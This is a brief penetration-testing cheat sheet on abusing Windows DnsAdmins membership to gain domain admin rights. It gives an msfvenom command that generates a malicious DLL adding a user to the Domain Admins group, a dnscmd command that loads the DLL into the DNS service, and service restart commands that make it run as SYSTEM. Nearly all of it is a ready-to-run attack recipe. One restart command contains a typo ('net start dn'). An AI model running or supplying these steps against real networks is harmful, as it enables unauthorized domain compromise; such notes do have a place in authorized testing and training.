# DnsAdmins

The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones

DNS service runs as **NT AUTHORITY\SYSTEM**

* Create malicious dll:

```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

* Download file to target
* Load dll as Member of DnsAdmins:

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

* Stop dns service: `sc stop dns` or `net stop dns`
* Start the service: `sc start dns` or `net start dn`
* `net group "Domain Admins" /dom` to check
